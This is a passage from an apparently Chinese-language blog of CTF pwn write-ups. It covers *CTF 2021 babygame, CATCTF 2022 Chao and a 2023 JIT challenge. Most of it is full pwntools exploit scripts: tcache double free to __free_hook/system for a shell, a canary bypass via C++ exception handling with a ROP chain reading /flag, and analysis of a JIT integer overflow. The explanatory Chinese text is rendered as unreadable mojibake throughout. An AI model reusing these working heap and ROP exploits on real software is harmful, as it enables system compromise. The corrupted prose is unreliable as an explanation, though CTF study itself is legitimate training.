class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">8</span>)<br>gdb.attach(p)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CTF-2021-babygameğŸ¤®"><a href="#CTF-2021-babygameğŸ¤®" class="headerlink" title="*CTF 2021 babygameğŸ¤®"></a>*CTF 2021 babygameğŸ¤®</h2><p>é€†ä¸ªğŸ•8ï¼ŒğŸ§ è¦ç‚¸äº†</p><p>ğŸ‘´ä¸€å¼€å§‹è§‰å¾—ğŸ‘´æŠŠ9ä¸ªå…³å¡é€šå…³äº†ğŸ‘´å°±winäº†ï¼Œ8å°±æ˜¯ç©æ¸¸æˆğŸï¼ŒğŸ‘´åœ¨è¡Œï¼Œso easy</p><p>ç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼ŒğŸ‘´å¯¹ç€IDAé‚£å¨å±å±±ä»£ç çœ‹äº†ä¸¤ä¸ªå°æ—¶çœ‹ä¸å‡ºæ¥ï¼ŒğŸ‘´æ‘†äº†ï¼Œæ¶¦</p><p>åæ¥ğŸ‘´æƒ³ç€fuzzè¯•è¯•ï¼Œç»“æœè¿™ä¸ªğŸ•8glibcæ˜¯glibc-2.27 ubuntu1.2çš„ç‰ˆæœ¬ï¼Œtcacheé‡Œè¿˜è«å¾—checkï¼Œtcache çš„double freeæ ¹æœ¬8ä¼šæŠ¥é”™ï¼Œå¦ˆå¦ˆç”Ÿçš„ã€‚</p><p>ğŸ‘´ğŸ³ï¸ï¼Œé’»è¿›ğŸ‘´åœ¨ä¸‹æ°´é“é˜´æš—çš„å°çªé‡Œçœ‹A3ğŸ‘´çš„wpï¼ŒğŸ‘´å¥½å¥‡A3ğŸ‘´æ˜¯æ€ä¹ˆè°ƒå‡ºæ¥å®Œæˆä¸€ä¸ªå…³å¡åï¼Œé€‰å®šä¸€ä¸ªå…³å¡ï¼Œç„¶åé€€å‡ºä¼šé€ æˆUAFçš„ã€‚</p><p>ç„¶åå°±å¾ˆç®€å•äº†ï¼Œstringå¯ä»¥ç”³è¯·ä»»æ„å¤§å°çš„chunkï¼Œé…åˆtcache double free æ‰“free_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babygame&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">x</span>):<br>    sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>    cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;korey0sh1&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;l&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>decode()<br>cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CATCTF-2022-ChaoğŸ›ï¸ğŸ’¤"><a href="#CATCTF-2022-ChaoğŸ›ï¸ğŸ’¤" class="headerlink" title="CATCTF 2022 ChaoğŸ›ï¸ğŸ’¤"></a>CATCTF 2022 ChaoğŸ›ï¸ğŸ’¤</h2><p>winmtğŸ‘´å‡ºçš„C++ Pwn</p><p>é€†åå•¦ğŸ¤®ğŸ¤®ğŸ¤®ğŸ¤®</p><p>Createé‡Œæœ‰0å’Œ1ä¸¤ç§typeï¼Œä½†è§‚å¯Ÿupdateå’ŒshowåŠŸèƒ½åï¼Œå°±èƒ½å‘ç°è¿™ä¸¤ä¸ªåŠŸèƒ½åªé€‚é…type0ã€‚ç„¶åçœ‹çœ‹ä¸¤ç§typeä¸åŒçš„è™šè¡¨å‡½æ•°ï¼Œå°±å‘ç°update type1èƒ½ç›´æ¥ä¼ªé€ sizeå’Œshowçš„åŸºå€ï¼Œä¾¿å¯ä»¥ä»»æ„åœ°å€è¯»ã€‚</p><p>å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œç„¶åç”¨0xfffffff7+0xa-1è¿™ç§è¡¥ç æ¼æ´æ¥è§¦å‘C++å¼‚å¸¸å¤„ç†ç»•è¿‡canary check</p><p><img src="/img/C++/13.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;chao&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0xdeadbeaf</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    edit(i+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0x11111</span>))<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>heap_base = u32(rc(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x5710</span><br><br>libc.address = u32(ru(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:]) - <span class="hljs-number">0x1e8780</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4ba9</span>))<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>elf_base = u32(rc(<span class="hljs-number">3</span>).rjust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x0c&#x27;</span>)) - <span class="hljs-number">0x4e0c</span><br>leak(<span class="hljs-string">&quot;elf&quot;</span>,elf_base)<br><br>lea_ret =  <span class="hljs-number">0x00110226</span>+libc.address<br>add_esp_1c = <span class="hljs-number">0x0001b034</span> + libc.address<br>ret = libc.address + <span class="hljs-number">0x0001922e</span><br>add_esp_4 = <span class="hljs-number">0x0002fe0e</span> + libc.address<br>add_esp_8 = <span class="hljs-number">0x0002fbe9</span> + libc.address<br>add_esp_c = <span class="hljs-number">0x0001b90a</span> + libc.address<br>int_0x80 = <span class="hljs-number">0x000312f5</span> + libc.address<br>pop_eax = <span class="hljs-number">0x000282eb</span> + libc.address<br>pop_ebx = <span class="hljs-number">0x0001de56</span> + libc.address<br>pop_ecx_edx = <span class="hljs-number">0x00030ea3</span> + libc.address<br>payload = flat([<br>    heap_base+<span class="hljs-number">0x54e8</span>,add_esp_1c,<br>    <span class="hljs-number">0x22222222</span>,<span class="hljs-number">0x33333333</span>,<span class="hljs-number">0x44444444</span>,<span class="hljs-number">0x55555555</span>,<span class="hljs-number">0x66666666</span>,<br>    lea_ret,<span class="hljs-number">0x88888888</span>,<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>],<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,heap_base+<span class="hljs-number">0x5524</span>,<br>])<br><br>orw = flat([<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],add_esp_8,heap_base+<span class="hljs-number">0x4c2f</span>,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],add_esp_1c,<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br>    ret,ret,ret,ret,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],add_esp_1c,<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br><br>])<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x11111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x1</span>))<br><br>edit(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0x4</span>) + p32(heap_base+<span class="hljs-number">0x54a8</span>)*<span class="hljs-number">3</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>)*<span class="hljs-number">4</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>) +p32(<span class="hljs-number">0x2044</span>+elf_base))<br><br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;......................................../flag&#x27;</span>)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x204c)\nc\n&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4bd9</span>))<br>show(<span class="hljs-number">0</span>)<br><br>sl(orw)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>é¢expå†™çš„å¾ˆä¹±ï¼Œå‡‘åˆç€çœ‹å§</p><h2 id="è¥¿è‘«èŠ¦ğŸ—¡-2023-JIT-ğŸ˜­"><a href="#è¥¿è‘«èŠ¦ğŸ—¡-2023-JIT-ğŸ˜­" class="headerlink" title="è¥¿è‘«èŠ¦ğŸ—¡ 2023 JIT ğŸ˜­"></a>è¥¿è‘«èŠ¦ğŸ—¡ 2023 JIT ğŸ˜­</h2><p>ä»Šå¹´å¹´åˆçš„è¥¿è‘«èŠ¦ğŸ—¡æ˜¯ğŸ‘´ç¬¬ä¸€æ¬¡æ‰“å¤§æ¯”èµ›ï¼Œå½“åˆğŸ‘´è¿˜ä¸æ‡‚äº‹ï¼Œå‡ºäº†ä¸¤é“ç®€å•é¢˜åè¿˜ä¸çŸ¥å¥½æ­¹ï¼Œçœ‹äº†ä¸€çœ¼jitï¼Œå½“æ—¶å°±è¢«å“å¾—äºšéº»å‘†ä½äº†ã€‚</p><p>åˆ¨åŸæŒ–å‡ºæ¥åº·åº·é¢˜ï¼Œç»“æœé€†äº†ä¸€å¤©é€†äº†ä¸ªå¤§æ¦‚ï¼Œç¬¬äºŒå¤©ä¸€ç›´åœ¨æƒ³æ€ä¹ˆèƒ½æŠŠ<code>shellcode</code>å†™åˆ°<code>exec_memory</code>é‡Œï¼Œæœ€åè¿˜æ˜¯çœ‹äº†rodeğŸ‘´çš„wpï¼Œç”¨äº†<code>jmp short</code> çš„çŸ­æŒ‡ä»¤å®Œæˆç³»ç»Ÿè°ƒç”¨ã€‚</p><h3 id="é€†äº¿ä¸‹ğŸ¤®ğŸ¤®"><a href="#é€†äº¿ä¸‹ğŸ¤®ğŸ¤®" class="headerlink" title="é€†äº¿ä¸‹ğŸ¤®ğŸ¤®"></a>é€†äº¿ä¸‹ğŸ¤®ğŸ¤®</h3><p>æ•´ä½“é€»è¾‘è¿˜è¡Œ</p><p>mmapäº†ä¸€ä¸ªå…·æœ‰rwxæƒé™çš„<code>memory</code>ï¼Œç»è¿‡<code>Compiler::handleFn</code>å¤„ç†åï¼Œè¾“å…¥çš„å†…å®¹ä¼šå˜æˆ<code>memory</code>å‡ºçš„æ±‡ç¼–ï¼Œæœ€åæ‰§è¡Œã€‚</p><p>ä¸€ä¸ªä¸ªæ¥çœ‹</p><p>è¿™ä¸ªç®—æ˜¯ä¸ªå¯¹<code>exec_memory</code>çš„åˆå§‹åŒ–</p><p><img src="/img/C++/14.png" alt="img"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">Compiler::</span>handleFn`å‡½æ•°é‡Œé¢ï¼Œä¼šè¯»å–è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œè¦æ±‚ä¸º\xffï¼Œå¹¶è¯»å–ç¬¬<span class="hljs-number">1</span>ã€<span class="hljs-number">2</span>ä¸ªå­—èŠ‚ä¸º`args`å’Œ`locals<br></code></pre></td></tr></table></figure><p><img src="/img/C++/15.png" alt="img"></p><p>è¿›å…¥<code>Compiler::creatFunc</code>ï¼Œ<code>args</code> è¦ å°äº8ï¼Œ<code>locals</code>è¦å°äº0x20ï¼Œç„¶ååœ¨<code>exec_memory</code>é‡Œç”¨<code>sub rsp, 8*locals</code>å¼€ä¸€ä¸ªæ ˆç©ºé—´</p><p><img src="/img/C++/16.png" alt="img"></p><p>ç„¶åè¿›å…¥æ ¸å¿ƒå‡½æ•°<code>Compiler::handleFnBody()</code></p><p>é‡Œé¢çš„<code>Compiler::var2idx</code>æ˜¯å°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼ŒåŠ¨è°ƒä¸€ä¸‹å‘ç°æ˜¯[rbp - ret_value*8]</p><p>å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šå±‚å‡½æ•°æ¥å—è¿”å›å€¼çš„å‚æ•°æ˜¯å•å­—èŠ‚çš„ï¼Œæ‰€ä»¥å½“varibä¸º0xa0æ—¶å¯ä»¥ä½¿è¿”å›å€¼ä¸º0ï¼Œå¯ä»¥ç›´æ¥å¯¹rbpè¿›è¡Œæ“ä½œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span> __cdecl <span class="hljs-title">Compiler::var2idx</span><span class="hljs-params">(u8 varib)</span></span><br><span class="hljs-function"></span>&#123;<br>  u8 variba; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x7F</span>) == <span class="hljs-number">0</span> )              <span class="hljs-comment">//varib!=0x7f </span><br>    <span class="hljs-built_in">fatal</span>();<br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x80</span>u) == <span class="hljs-number">0</span> )             <span class="hljs-comment">//varib &lt; 0x80</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( varib &gt; Compiler::ctx_args )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">8</span> * varib) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">8</span> * varib;<br>  &#125;<br>  <span class="hljs-keyword">else</span>                  <span class="hljs-number">1000</span>     <span class="hljs-number">1010</span>             <span class="hljs-comment">//varib &gt; 0x80</span><br>  &#123;<br>    variba = varib ^ <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(varib ^ <span class="hljs-number">0x80</span>) &gt; Compiler::ctx_locals )    <span class="hljs-comment">//å½“localsè®¾ç½®ä¸ºmax 0x20,varib max = 0xa0</span><br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">-8</span> * variba) &gt; <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-8</span> * variba;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/C++/17.png" alt="img"></p><p>åé¢å°±æ˜¯0-5çš„<code>opcode</code>ï¼Œ6çš„åˆ©ç”¨æ¡ä»¶å¤ªtmçƒ¦äº†ğŸ‘´å°±æ²¡çœ‹</p><p>åŸºæœ¬ä¸Šå°±æ˜¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        v0 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// æ„Ÿè§‰æ˜¯ret</span><br>        <span class="hljs-keyword">return</span> Compiler::<span class="hljs-built_in">var2idx</span>(v0);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        v2 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// mov [rbp - var],num</span><br>        var = Compiler::<span 